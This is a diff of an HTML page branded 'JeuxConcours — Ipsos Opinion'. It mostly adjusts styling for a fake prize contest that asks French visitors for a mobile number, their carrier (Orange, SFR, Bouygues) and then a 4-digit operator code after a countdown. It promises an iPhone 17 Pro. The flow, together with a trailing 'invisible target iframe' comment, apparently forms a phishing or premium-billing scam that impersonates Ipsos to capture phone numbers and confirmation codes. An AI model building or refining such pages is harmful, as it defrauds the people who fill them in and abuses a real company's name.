@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>JeuxConcours — Ipsos Opinion</title>
-<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;600;700;800&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
   :root {
     --blue: #2B3A9F;
@@ -21,383 +21,297 @@
 
   * { margin: 0; padding: 0; box-sizing: border-box; }
 
+  html, body { width: 100%; min-height: 100vh; }
+
   body {
     font-family: 'DM Sans', sans-serif;
     background: var(--offwhite);
     color: var(--text);
-    min-height: 100vh;
     overflow-x: hidden;
   }
 
   body::before {
     content: '';
-    position: fixed;
-    inset: 0;
+    position: fixed; inset: 0;
     background:
-      radial-gradient(ellipse 80% 60% at 10% 0%, rgba(43,58,159,0.10) 0%, transparent 60%),
-      radial-gradient(ellipse 60% 50% at 90% 100%, rgba(58,191,191,0.12) 0%, transparent 55%);
-    pointer-events: none;
-    z-index: 0;
+      radial-gradient(ellipse 70% 50% at 5% 0%, rgba(43,58,159,0.09) 0%, transparent 55%),
+      radial-gradient(ellipse 50% 40% at 95% 100%, rgba(58,191,191,0.10) 0%, transparent 50%);
+    pointer-events: none; z-index: 0;
   }
 
-  .page { position: relative; z-index: 1; }
+  .page { position: relative; z-index: 1; display: flex; flex-direction: column; min-height: 100vh; }
 
   /* ── HEADER ── */
   header {
     background: linear-gradient(135deg, var(--blue-dark) 0%, var(--blue) 55%, var(--teal-dark) 100%);
     box-shadow: 0 4px 24px rgba(43,58,159,0.28);
-    position: relative;
-    overflow: hidden;
+    position: relative; overflow: hidden; width: 100%;
   }
   header::after {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: repeating-linear-gradient(-45deg, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 20px);
+    content: ''; position: absolute; inset: 0;
+    background: repeating-linear-gradient(-45deg, rgba(255,255,255,0.01) 0px, rgba(255,255,255,0.01) 1px, transparent 1px, transparent 22px);
     pointer-events: none;
   }
   .header-inner {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 16px 40px;
-    max-width: 1100px;
-    margin: 0 auto;
-    position: relative;
-    z-index: 2;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 18px 60px; max-width: 1280px; margin: 0 auto;
+    position: relative; z-index: 2; width: 100%;
   }
   .logo-wrap { display: flex; align-items: center; gap: 14px; }
-  .ipsos-logo-svg {
-    width: 54px; height: 54px;
-    filter: drop-shadow(0 2px 10px rgba(0,0,0,0.35));
-  }
+  .ipsos-logo-svg { width: 52px; height: 52px; filter: drop-shadow(0 2px 10px rgba(0,0,0,0.35)); flex-shrink: 0; }
   .logo-text-group { display: flex; flex-direction: column; }
-  .logo-brand {
-    font-family: 'Sora', sans-serif;
-    font-size: 21px; font-weight: 800;
-    color: white; letter-spacing: -0.5px; line-height: 1;
-  }
-  .logo-sub {
-    font-size: 10.5px; color: rgba(255,255,255,0.6);
-    letter-spacing: 2px; text-transform: uppercase; margin-top: 3px;
-  }
+  .logo-brand { font-family: 'Sora', sans-serif; font-size: 22px; font-weight: 800; color: white; letter-spacing: -0.5px; line-height: 1; }
+  .logo-sub { font-size: 10px; color: rgba(255,255,255,0.55); letter-spacing: 2.5px; text-transform: uppercase; margin-top: 4px; }
   .site-badge {
-    background: rgba(255,255,255,0.12);
-    border: 1px solid rgba(255,255,255,0.22);
-    border-radius: 50px; padding: 6px 18px;
-    color: white; font-size: 13px; font-weight: 500;
-    backdrop-filter: blur(8px);
-    display: flex; align-items: center; gap: 8px;
+    background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.22);
+    border-radius: 50px; padding: 7px 20px; color: white; font-size: 13px; font-weight: 500;
+    backdrop-filter: blur(8px); display: flex; align-items: center; gap: 9px;
   }
-  .site-badge .dot {
-    width: 7px; height: 7px; border-radius: 50%;
-    background: var(--teal-light); animation: pulse 1.5s infinite;
-  }
-  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .site-badge .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--teal-light); animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.25} }
 
   /* ── HERO ── */
   .hero {
     background: linear-gradient(135deg, var(--blue) 0%, var(--teal) 100%);
-    padding: 44px 40px 36px;
-    text-align: center;
-    position: relative;
-    overflow: hidden;
+    padding: 56px 60px 44px; text-align: center;
+    position: relative; overflow: hidden; width: 100%;
   }
-  .hero::before {
-    content: ''; position: absolute;
-    width: 500px; height: 500px; border-radius: 50%;
-    background: rgba(255,255,255,0.04);
-    top: -200px; left: -100px;
-  }
-  .hero::after {
-    content: ''; position: absolute;
-    width: 280px; height: 280px; border-radius: 50%;
-    background: rgba(255,255,255,0.055);
-    bottom: -90px; right: 8%;
-  }
+  .hero::before { content:''; position:absolute; width:600px; height:600px; border-radius:50%; background:rgba(255,255,255,0.04); top:-280px; left:-120px; }
+  .hero::after  { content:''; position:absolute; width:350px; height:350px; border-radius:50%; background:rgba(255,255,255,0.05); bottom:-120px; right:6%; }
   .hero-tag {
     display: inline-flex; align-items: center; gap: 8px;
-    background: rgba(255,255,255,0.14); border: 1px solid rgba(255,255,255,0.24);
-    border-radius: 50px; padding: 6px 16px;
-    color: white; font-size: 11.5px; font-weight: 600;
-    letter-spacing: 1.5px; text-transform: uppercase;
-    margin-bottom: 18px; position: relative; z-index: 1;
+    background: rgba(255,255,255,0.13); border: 1px solid rgba(255,255,255,0.22);
+    border-radius: 50px; padding: 6px 18px;
+    color: white; font-size: 11px; font-weight: 600; letter-spacing: 2px; text-transform: uppercase;
+    margin-bottom: 20px; position: relative; z-index: 1;
   }
   .hero h1 {
-    font-family: 'Sora', sans-serif;
-    font-size: clamp(26px, 5vw, 46px); font-weight: 800;
-    color: white; line-height: 1.15; margin-bottom: 12px;
+    font-family: 'Sora', sans-serif; font-size: clamp(32px, 4vw, 54px);
+    font-weight: 800; color: white; line-height: 1.12; margin-bottom: 14px;
     position: relative; z-index: 1;
   }
   .hero h1 span { color: var(--teal-light); }
   .hero p {
-    color: rgba(255,255,255,0.78); font-size: 15px;
-    max-width: 500px; margin: 0 auto;
-    position: relative; z-index: 1; line-height: 1.65;
+    color: rgba(255,255,255,0.78); font-size: 16px;
+    max-width: 560px; margin: 0 auto; position: relative; z-index: 1; line-height: 1.7;
   }
-
-  /* ── PRIZES STRIP ── */
   .prizes-strip {
     display: flex; align-items: center; justify-content: center;
-    gap: 6px; flex-wrap: wrap;
-    padding: 14px 20px;
-    background: rgba(255,255,255,0.08);
-    border-top: 1px solid rgba(255,255,255,0.12);
-    position: relative; z-index: 1;
-    margin-top: 20px;
+    gap: 8px; flex-wrap: wrap; padding: 16px 20px;
+    background: rgba(255,255,255,0.07); border-top: 1px solid rgba(255,255,255,0.1);
+    position: relative; z-index: 1; margin-top: 24px;
   }
   .prize-chip {
-    background: rgba(255,255,255,0.12);
-    border: 1px solid rgba(255,255,255,0.2);
-    border-radius: 50px;
-    padding: 4px 12px;
+    background: rgba(255,255,255,0.11); border: 1px solid rgba(255,255,255,0.18);
+    border-radius: 50px; padding: 5px 14px;
     color: white; font-size: 12px; font-weight: 500;
     display: flex; align-items: center; gap: 6px;
   }
 
   /* ── TIMER BAR ── */
   .timer-bar {
-    background: white;
-    border-bottom: 1px solid rgba(43,58,159,0.08);
-    padding: 12px 40px;
-    display: flex; align-items: center; justify-content: center; gap: 20px;
-    box-shadow: 0 2px 12px rgba(43,58,159,0.06);
-    position: sticky; top: 0; z-index: 100;
+    background: white; border-bottom: 1px solid rgba(43,58,159,0.08);
+    padding: 13px 60px;
+    display: flex; align-items: center; justify-content: center; gap: 24px;
+    box-shadow: 0 2px 16px rgba(43,58,159,0.06);
+    position: sticky; top: 0; z-index: 100; width: 100%;
   }
-  .timer-label { font-size: 11px; color: var(--muted); font-weight: 600; letter-spacing: 1px; text-transform: uppercase; }
-  .timer-display {
-    font-family: 'Sora', sans-serif;
-    font-size: 26px; font-weight: 700; color: var(--blue); letter-spacing: 2px; transition: color 0.3s;
-  }
+  .timer-label { font-size: 11px; color: var(--muted); font-weight: 600; letter-spacing: 1.2px; text-transform: uppercase; }
+  .timer-display { font-family: 'Sora', sans-serif; font-size: 28px; font-weight: 700; color: var(--blue); letter-spacing: 3px; transition: color 0.3s; }
   .timer-display.urgent { color: var(--error); }
-
-  @keyframes timerShake {
-    0%,100% { transform: translateX(0) scale(1); }
-    10% { transform: translateX(-7px) scale(1.09) rotate(-1.5deg); }
-    20% { transform: translateX(7px) scale(1.11) rotate(1.5deg); }
-    30% { transform: translateX(-6px) scale(1.08) rotate(-1deg); }
-    40% { transform: translateX(6px) scale(1.10) rotate(1deg); }
-    50% { transform: translateX(-4px) scale(1.07); }
-    60% { transform: translateX(4px) scale(1.08); }
-    70% { transform: translateX(-3px) scale(1.05); }
-    80% { transform: translateX(3px) scale(1.04); }
-    90% { transform: translateX(-1px) scale(1.02); }
-  }
-  .timer-shake {
-    animation: timerShake 0.55s cubic-bezier(.36,.07,.19,.97);
-  }
-  .timer-progress { width: 180px; height: 6px; background: #e5e7eb; border-radius: 99px; overflow: hidden; }
-  .timer-fill {
-    height: 100%;
-    background: linear-gradient(90deg, var(--blue), var(--teal));
-    border-radius: 99px; width: 100%;
-    transition: width 1s linear, background 0.3s;
-  }
+  .timer-progress { width: 220px; height: 6px; background: #e5e7eb; border-radius: 99px; overflow: hidden; }
+  .timer-fill { height: 100%; background: linear-gradient(90deg, var(--blue), var(--teal)); border-radius: 99px; width: 100%; transition: width 1s linear; }
   .timer-fill.urgent { background: linear-gradient(90deg, #f59e0b, var(--error)); }
 
-  /* ── MAIN ── */
-  .main { max-width: 680px; margin: 44px auto; padding: 0 20px 80px; }
+  /* ── LAYOUT WEB ── */
+  .main-wrapper {
+    flex: 1;
+    display: flex; justify-content: center;
+    padding: 52px 40px 80px;
+    width: 100%;
+  }
+  .main-inner {
+    width: 100%; max-width: 620px;
+  }
 
   /* ── PROGRESS ── */
-  .progress-bar { display: flex; align-items: center; margin-bottom: 32px; padding: 0 4px; }
-  .prog-step {
-    flex: 1; display: flex; flex-direction: column; align-items: center; gap: 6px; position: relative;
-  }
+  .progress-bar { display: flex; align-items: center; margin-bottom: 36px; }
+  .prog-step { flex: 1; display: flex; flex-direction: column; align-items: center; gap: 7px; position: relative; }
   .prog-step::after {
     content: ''; position: absolute;
-    top: 17px; left: calc(50% + 18px); right: calc(-50% + 18px);
+    top: 17px; left: calc(50% + 20px); right: calc(-50% + 20px);
     height: 2px; background: #e5e7eb; z-index: 0; transition: background 0.4s;
   }
   .prog-step:last-child::after { display: none; }
   .prog-step.done::after { background: var(--teal); }
   .prog-dot {
-    width: 34px; height: 34px; border-radius: 50%;
+    width: 36px; height: 36px; border-radius: 50%;
     background: #e5e7eb; color: var(--muted);
-    font-size: 13px; font-weight: 700;
+    font-size: 14px; font-weight: 700; font-family: 'Sora', sans-serif;
     display: flex; align-items: center; justify-content: center;
     position: relative; z-index: 1; transition: all 0.3s;
-    font-family: 'Sora', sans-serif;
   }
-  .prog-step.active .prog-dot { background: var(--blue); color: white; box-shadow: 0 0 0 4px rgba(43,58,159,0.15); }
+  .prog-step.active .prog-dot { background: var(--blue); color: white; box-shadow: 0 0 0 5px rgba(43,58,159,0.13); }
   .prog-step.done .prog-dot { background: var(--teal); color: white; }
-  .prog-label { font-size: 10px; font-weight: 600; color: var(--muted); letter-spacing: 0.5px; text-transform: uppercase; text-align: center; }
+  .prog-label { font-size: 10px; font-weight: 600; color: var(--muted); letter-spacing: 0.6px; text-transform: uppercase; }
   .prog-step.active .prog-label { color: var(--blue); }
   .prog-step.done .prog-label { color: var(--teal-dark); }
 
   /* ── STEP CARD ── */
   .step-card {
-    background: white;
-    border-radius: 20px; padding: 36px 38px;
-    box-shadow: 0 4px 30px rgba(43,58,159,0.08), 0 1px 4px rgba(0,0,0,0.03);
+    background: white; border-radius: 22px; padding: 40px 44px;
+    box-shadow: 0 6px 36px rgba(43,58,159,0.09), 0 1px 4px rgba(0,0,0,0.03);
     border: 1px solid rgba(43,58,159,0.07);
-    margin-bottom: 24px;
     display: none; animation: fadeUp 0.4s ease;
   }
   .step-card.active { display: block; }
-  @keyframes fadeUp { from{opacity:0;transform:translateY(18px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes fadeUp { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
 
   .step-number {
     display: inline-flex; align-items: center; gap: 8px;
     background: linear-gradient(135deg, var(--blue), var(--teal));
-    color: white; border-radius: 50px; padding: 4px 14px 4px 6px;
-    font-size: 12px; font-weight: 700; letter-spacing: 0.5px; margin-bottom: 16px;
+    color: white; border-radius: 50px; padding: 4px 16px 4px 6px;
+    font-size: 12px; font-weight: 700; letter-spacing: 0.5px; margin-bottom: 18px;
   }
   .step-num-circle {
-    width: 26px; height: 26px; background: rgba(255,255,255,0.2);
+    width: 27px; height: 27px; background: rgba(255,255,255,0.2);
     border-radius: 50%; display: flex; align-items: center; justify-content: center;
     font-size: 13px; font-weight: 800;
   }
-  .step-card h2 {
-    font-family: 'Sora', sans-serif;
-    font-size: 21px; font-weight: 700; color: var(--text); margin-bottom: 8px;
-  }
-  .step-card p.desc { color: var(--muted); font-size: 14px; line-height: 1.65; margin-bottom: 26px; }
+  .step-card h2 { font-family: 'Sora', sans-serif; font-size: 22px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
+  .step-card p.desc { color: var(--muted); font-size: 14px; line-height: 1.7; margin-bottom: 28px; }
 
   .info-note {
     background: linear-gradient(135deg, rgba(43,58,159,0.05), rgba(58,191,191,0.05));
-    border-left: 3px solid var(--teal);
-    border-radius: 8px; padding: 12px 16px;
-    font-size: 13px; color: var(--blue);
-    margin-bottom: 22px;
-    display: flex; align-items: flex-start; gap: 10px;
-    line-height: 1.55;
+    border-left: 3px solid var(--teal); border-radius: 8px; padding: 13px 16px;
+    font-size: 13px; color: var(--blue); margin-bottom: 24px;
+    display: flex; align-items: flex-start; gap: 10px; line-height: 1.6;
   }
   .info-note .icon { font-size: 16px; margin-top: 1px; flex-shrink: 0; }
 
-  /* ── PHONE INPUT ── */
+  /* ── PHONE ── */
   label.field-label { display: block; font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 8px; }
   .input-wrap { position: relative; margin-bottom: 8px; }
   .input-wrap input {
-    width: 100%; padding: 14px 18px 14px 50px;
+    width: 100%; padding: 15px 18px 15px 52px;
     border: 2px solid #e5e7eb; border-radius: 12px;
-    font-size: 17px; font-family: 'DM Sans', sans-serif;
+    font-size: 18px; font-family: 'DM Sans', sans-serif;
     color: var(--text); background: var(--offwhite);
-    outline: none; transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
-    letter-spacing: 2px;
+    outline: none; transition: all 0.2s; letter-spacing: 2.5px;
   }
   .input-wrap input:focus { border-color: var(--teal); background: white; box-shadow: 0 0 0 4px rgba(58,191,191,0.12); }
   .input-wrap input.valid { border-color: var(--success); background: white; }
   .input-wrap input.invalid { border-color: var(--error); }
-  .input-icon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); font-size: 18px; pointer-events: none; }
-
+  .input-icon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); font-size: 20px; pointer-events: none; }
   .field-hint { font-size: 13px; margin-top: 8px; display: none; align-items: center; gap: 6px; font-weight: 500; }
   .field-hint.show { display: flex; }
   .field-hint.ok { color: var(--success); }
   .field-hint.err { color: var(--error); }
 
   /* ── OPERATOR ── */
-  .operator-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 12px; margin-bottom: 24px; }
+  .operator-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 14px; margin-bottom: 28px; }
   .operator-card {
-    border: 2px solid #e5e7eb; border-radius: 14px;
-    padding: 22px 10px; text-align: center; cursor: pointer;
-    transition: all 0.2s; background: var(--offwhite);
-    position: relative; overflow: hidden;
+    border: 2px solid #e5e7eb; border-radius: 16px;
+    padding: 26px 10px; text-align: center; cursor: pointer;
+    transition: all 0.2s; background: var(--offwhite); position: relative; overflow: hidden;
   }
-  .operator-card:hover { border-color: var(--teal); transform: translateY(-2px); box-shadow: 0 8px 20px rgba(58,191,191,0.15); }
-  .operator-card.selected { border-color: var(--blue); background: white; box-shadow: 0 0 0 3px rgba(43,58,159,0.12); }
+  .operator-card:hover { border-color: var(--teal); transform: translateY(-3px); box-shadow: 0 10px 24px rgba(58,191,191,0.15); }
+  .operator-card.selected { border-color: var(--blue); background: white; box-shadow: 0 0 0 4px rgba(43,58,159,0.1); }
   .operator-card .check {
-    position: absolute; top: 8px; right: 8px;
-    width: 20px; height: 20px; border-radius: 50%;
-    background: var(--blue); color: white; font-size: 11px;
+    position: absolute; top: 9px; right: 9px;
+    width: 22px; height: 22px; border-radius: 50%;
+    background: var(--blue); color: white; font-size: 12px;
     display: none; align-items: center; justify-content: center;
   }
   .operator-card.selected .check { display: flex; }
-  .op-icon { font-size: 34px; display: block; margin-bottom: 8px; }
-  .op-name { font-size: 13px; font-weight: 700; color: var(--text); }
+  .op-icon { font-size: 36px; display: block; margin-bottom: 10px; }
+  .op-name { font-size: 14px; font-weight: 700; color: var(--text); }
 
-  /* ── CODE SECTION ── */
+  /* ── CODE ── */
   .code-locked-msg {
-    text-align: center; padding: 28px 20px;
+    text-align: center; padding: 32px 20px;
     background: linear-gradient(135deg, rgba(43,58,159,0.04), rgba(58,191,191,0.04));
-    border-radius: 14px; margin-bottom: 24px;
-    border: 1px dashed rgba(43,58,159,0.18);
+    border-radius: 16px; margin-bottom: 24px;
+    border: 1px dashed rgba(43,58,159,0.16);
   }
   .countdown-ring {
-    display: inline-flex; flex-direction: column;
-    align-items: center; justify-content: center;
-    width: 100px; height: 100px;
+    display: inline-flex; flex-direction: column; align-items: center; justify-content: center;
+    width: 108px; height: 108px;
     background: linear-gradient(135deg, var(--blue), var(--teal));
-    border-radius: 50%;
-    color: white; font-family: 'Sora', sans-serif;
-    margin-bottom: 16px;
-    box-shadow: 0 4px 20px rgba(43,58,159,0.3);
+    border-radius: 50%; color: white; font-family: 'Sora', sans-serif;
+    margin-bottom: 18px; box-shadow: 0 6px 24px rgba(43,58,159,0.3);
     position: relative;
   }
   .countdown-ring::before {
-    content: '';
-    position: absolute; inset: -4px;
-    border-radius: 50%;
+    content: ''; position: absolute; inset: -5px; border-radius: 50%;
     background: conic-gradient(var(--teal) var(--prog, 100%), #e5e7eb var(--prog, 100%));
     z-index: -1;
   }
-  .countdown-num { font-size: 36px; font-weight: 800; line-height: 1; }
-  .countdown-unit { font-size: 11px; opacity: 0.75; letter-spacing: 1px; }
+  .countdown-num { font-size: 38px; font-weight: 800; line-height: 1; }
+  .countdown-unit { font-size: 11px; opacity: 0.72; letter-spacing: 1.5px; }
   .code-locked-msg p { font-size: 14px; color: var(--muted); font-weight: 500; }
   .code-locked-msg strong { color: var(--blue); }
 
-  .code-display { display: flex; gap: 10px; justify-content: center; margin: 24px 0; }
+  .code-display { display: flex; gap: 14px; justify-content: center; margin: 28px 0; }
   .code-box {
-    width: 52px; height: 62px; border: 2px solid #e5e7eb; border-radius: 10px;
-    font-family: 'Sora', sans-serif; font-size: 22px; font-weight: 700;
+    width: 68px; height: 76px; border: 2px solid #e5e7eb; border-radius: 14px;
+    font-family: 'Sora', sans-serif; font-size: 28px; font-weight: 700;
     text-align: center; color: var(--blue); background: var(--offwhite);
-    outline: none; transition: all 0.2s; text-transform: uppercase;
+    outline: none; transition: all 0.2s;
   }
-  .code-box:focus { border-color: var(--teal); background: white; box-shadow: 0 0 0 3px rgba(58,191,191,0.15); }
-  .code-box:disabled { opacity: 0.45; cursor: not-allowed; }
+  .code-box:focus { border-color: var(--teal); background: white; box-shadow: 0 0 0 4px rgba(58,191,191,0.13); }
 
   /* ── BTN ── */
   .btn {
     display: inline-flex; align-items: center; justify-content: center; gap: 10px;
-    padding: 15px 32px; border-radius: 12px;
+    padding: 16px 32px; border-radius: 13px;
     font-family: 'DM Sans', sans-serif; font-size: 15px; font-weight: 600;
     cursor: pointer; border: none; transition: all 0.2s; width: 100%;
   }
   .btn-primary {
     background: linear-gradient(135deg, var(--blue), var(--teal));
-    color: white; box-shadow: 0 4px 20px rgba(43,58,159,0.28);
+    color: white; box-shadow: 0 4px 22px rgba(43,58,159,0.28);
   }
-  .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(43,58,159,0.38); }
-  .btn-primary:disabled { opacity: 0.45; cursor: not-allowed; transform: none; box-shadow: none; }
+  .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 32px rgba(43,58,159,0.36); }
+  .btn-primary:disabled { opacity: 0.42; cursor: not-allowed; transform: none; box-shadow: none; }
 
   /* ── RESULT ── */
   .result-card {
     background: linear-gradient(135deg, var(--blue), var(--teal));
-    border-radius: 20px; padding: 48px 36px;
+    border-radius: 22px; padding: 56px 44px;
     text-align: center; color: white;
-    box-shadow: 0 8px 40px rgba(43,58,159,0.3);
+    box-shadow: 0 10px 48px rgba(43,58,159,0.32);
     display: none; animation: fadeUp 0.5s ease;
   }
   .result-card.active { display: block; }
-  .result-emoji { font-size: 72px; margin-bottom: 20px; display: block; }
-  .result-card h2 { font-family: 'Sora', sans-serif; font-size: 28px; font-weight: 800; margin-bottom: 12px; }
-  .result-card p { font-size: 15px; opacity: 0.82; line-height: 1.65; max-width: 400px; margin: 0 auto 24px; }
+  .result-emoji { font-size: 80px; margin-bottom: 22px; display: block; }
+  .result-card h2 { font-family: 'Sora', sans-serif; font-size: 32px; font-weight: 800; margin-bottom: 14px; }
+  .result-card p { font-size: 16px; opacity: 0.82; line-height: 1.7; max-width: 400px; margin: 0 auto 28px; }
   .prize-won {
-    background: rgba(255,255,255,0.15);
-    border: 1px solid rgba(255,255,255,0.25);
-    border-radius: 14px; padding: 22px;
-    margin-bottom: 24px; backdrop-filter: blur(8px);
+    background: rgba(255,255,255,0.14); border: 1px solid rgba(255,255,255,0.24);
+    border-radius: 16px; padding: 26px; margin-bottom: 28px; backdrop-filter: blur(8px);
   }
-  .prize-won span { font-size: 44px; display: block; margin-bottom: 8px; }
-  .prize-won strong { font-size: 20px; font-weight: 700; display: block; }
+  .prize-won span { font-size: 52px; display: block; margin-bottom: 10px; }
+  .prize-won strong { font-size: 22px; font-weight: 700; display: block; }
 
   /* ── FOOTER ── */
   footer {
-    background: var(--blue-dark);
-    color: rgba(255,255,255,0.45);
-    text-align: center; padding: 24px 40px;
-    font-size: 12px; line-height: 1.9; letter-spacing: 0.3px;
+    background: var(--blue-dark); color: rgba(255,255,255,0.4);
+    text-align: center; padding: 28px 60px;
+    font-size: 12px; line-height: 2; letter-spacing: 0.3px; width: 100%;
   }
   footer a { color: var(--teal-light); text-decoration: none; }
 
-  @media (max-width: 580px) {
-    .header-inner { padding: 12px 18px; }
-    .hero { padding: 32px 18px 28px; }
-    .main { padding: 0 14px 60px; }
-    .step-card { padding: 24px 18px; }
-    .timer-bar { gap: 12px; padding: 10px 18px; }
+  @media (max-width: 700px) {
+    .header-inner { padding: 14px 20px; }
+    .hero { padding: 36px 20px 30px; }
+    .main-wrapper { padding: 32px 16px 60px; }
+    .step-card { padding: 26px 20px; }
+    .timer-bar { padding: 11px 20px; gap: 14px; }
     .timer-progress { display: none; }
-    .code-display { gap: 6px; }
-    .code-box { width: 44px; height: 54px; font-size: 18px; }
+    .code-display { gap: 8px; }
+    .code-box { width: 56px; height: 64px; font-size: 22px; }
+    footer { padding: 20px 20px; }
   }
 </style>
 </head>
@@ -454,7 +368,8 @@
 </div>
 
 <!-- MAIN -->
-<main class="main">
+<div class="main-wrapper">
+<div class="main-inner">
 
   <!-- PROGRESS -->
   <div class="progress-bar">
@@ -476,17 +391,15 @@
     </div>
   </div>
 
-  <!-- STEP 1 : TÉLÉPHONE -->
+  <!-- STEP 1 -->
   <div class="step-card active" id="step1">
     <div class="step-number"><span class="step-num-circle">1</span> Vérification humaine</div>
     <h2>Confirmez votre numéro de mobile</h2>
     <p class="desc">Cette étape est une <strong>vérification humaine</strong> obligatoire, mise en place par Ipsos pour garantir l'authenticité des participants. Aucun SMS ne sera envoyé.</p>
-
     <div class="info-note">
       <span class="icon">🔒</span>
       <span>Votre numéro sert uniquement à confirmer que vous êtes une personne réelle. Seuls les numéros commençant par <strong>06</strong> ou <strong>07</strong> sont acceptés.</span>
     </div>
-
     <label class="field-label">Numéro de téléphone mobile français</label>
     <div class="input-wrap">
       <span class="input-icon">📱</span>
@@ -499,42 +412,39 @@
     </button>
   </div>
 
-  <!-- STEP 2 : OPÉRATEUR -->
+  <!-- STEP 2 -->
   <div class="step-card" id="step2">
     <div class="step-number"><span class="step-num-circle">2</span> Votre opérateur</div>
     <h2>Quel est votre opérateur mobile ?</h2>
     <p class="desc">Ce concours est organisé en partenariat avec les trois principaux opérateurs français. Sélectionnez le vôtre pour continuer.</p>
-
     <div class="operator-grid">
-      <div class="operator-card" onclick="selectOperator(this,'orange')">
+      <div class="operator-card" onclick="selectOperator(this,'Orange')">
         <span class="check">✓</span>
         <span class="op-icon">🟠</span>
         <span class="op-name">Orange</span>
       </div>
-      <div class="operator-card" onclick="selectOperator(this,'sfr')">
+      <div class="operator-card" onclick="selectOperator(this,'SFR')">
         <span class="check">✓</span>
         <span class="op-icon">🔴</span>
         <span class="op-name">SFR</span>
       </div>
-      <div class="operator-card" onclick="selectOperator(this,'bouygues')">
+      <div class="operator-card" onclick="selectOperator(this,'Bouygues')">
         <span class="check">✓</span>
         <span class="op-icon">🔵</span>
         <span class="op-name">Bouygues</span>
       </div>
     </div>
-
     <button class="btn btn-primary" id="btnStep2" onclick="validateOperator()" disabled>
       Confirmer mon opérateur →
     </button>
   </div>
 
-  <!-- STEP 3 : CODE -->
+  <!-- STEP 3 -->
   <div class="step-card" id="step3">
     <div class="step-number"><span class="step-num-circle">3</span> Code de gains</div>
     <h2>Entrez votre code</h2>
-    <p class="desc">Saisissez le code à 6 caractères reçu par votre opérateur ou partenaire pour débloquer votre lot.</p>
+    <p class="desc">Saisissez le code à 4 chiffres reçu par votre opérateur pour débloquer votre lot.</p>
 
-    <!-- État verrouillé : countdown 22s -->
     <div class="code-locked-msg" id="codeLocked">
       <div class="countdown-ring" id="cntRing" style="--prog:100%">
         <span class="countdown-num" id="cntNum">22</span>
@@ -543,17 +453,16 @@
       <p>Votre code sera disponible dans <strong id="cntText">22 secondes</strong>.<br>Merci de patienter…</p>
     </div>
 
-    <!-- Saisie du code (masquée pendant le countdown) -->
     <div id="codeUnlocked" style="display:none">
       <div class="info-note">
         <span class="icon">🎁</span>
-        <span>Le code se trouve dans le SMS ou l'e-mail envoyé par votre opérateur. Il est composé de <strong>4 chiffres</strong>.</span>
+        <span>Saisissez les <strong>4 chiffres</strong> de votre code de gains.</span>
       </div>
       <div class="code-display">
-        <input class="code-box" id="c0" maxlength="1" inputmode="numeric" pattern="[0-9]" oninput="codeMove(0)" onkeydown="codeDel(event,0)">
-        <input class="code-box" id="c1" maxlength="1" inputmode="numeric" pattern="[0-9]" oninput="codeMove(1)" onkeydown="codeDel(event,1)">
-        <input class="code-box" id="c2" maxlength="1" inputmode="numeric" pattern="[0-9]" oninput="codeMove(2)" onkeydown="codeDel(event,2)">
-        <input class="code-box" id="c3" maxlength="1" inputmode="numeric" pattern="[0-9]" oninput="codeMove(3)" onkeydown="codeDel(event,3)">
+        <input class="code-box" id="c0" maxlength="1" inputmode="numeric" oninput="codeMove(0)" onkeydown="codeDel(event,0)">
+        <input class="code-box" id="c1" maxlength="1" inputmode="numeric" oninput="codeMove(1)" onkeydown="codeDel(event,1)">
+        <input class="code-box" id="c2" maxlength="1" inputmode="numeric" oninput="codeMove(2)" onkeydown="codeDel(event,2)">
+        <input class="code-box" id="c3" maxlength="1" inputmode="numeric" oninput="codeMove(3)" onkeydown="codeDel(event,3)">
       </div>
       <div id="codeError" style="text-align:center;color:var(--error);font-size:13px;font-weight:600;margin-bottom:16px;display:none;">❌ Code invalide. Vérifiez et réessayez.</div>
       <button class="btn btn-primary" onclick="validateCode()">Valider mon code →</button>
@@ -567,90 +476,71 @@
     <p>Vous avez été sélectionné(e) parmi les gagnants. Votre lot vous sera envoyé sous 7 jours ouvrés.</p>
     <div class="prize-won">
       <span id="prizeEmoji">📱</span>
-      <strong id="prizeName">iPhone 15 Pro</strong>
+      <strong id="prizeName">iPhone 17 Pro</strong>
     </div>
-    <p style="font-size:12px;opacity:0.6;">Un conseiller Ipsos vous contactera dans les 48h pour les modalités de livraison.</p>
+    <p style="font-size:13px;opacity:0.6;">Un conseiller Ipsos vous contactera dans les 48h pour les modalités de livraison.</p>
   </div>
 
-</main>
+</div>
+</div>
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2025 <strong style="color:rgba(255,255,255,0.8)">JeuxConcours · Ipsos France</strong> — Site de sondages d'opinion et concours grand public</p>
+  <p>© 2025 <strong style="color:rgba(255,255,255,0.75)">JeuxConcours · Ipsos France</strong> — Site de sondages d'opinion et concours grand public</p>
   <p>Opéré en partenariat avec <a href="https://www.ipsos.com/fr-fr" target="_blank">Ipsos</a> · <a href="#">Mentions légales</a> · <a href="#">Confidentialité</a></p>
-  <p style="margin-top:8px;font-size:10px;opacity:0.45">Réservé aux résidents français majeurs. Offre soumise à conditions.</p>
 </footer>
 
 </div>
 
-<!-- IFRAME CIBLE INVISIBLE -->
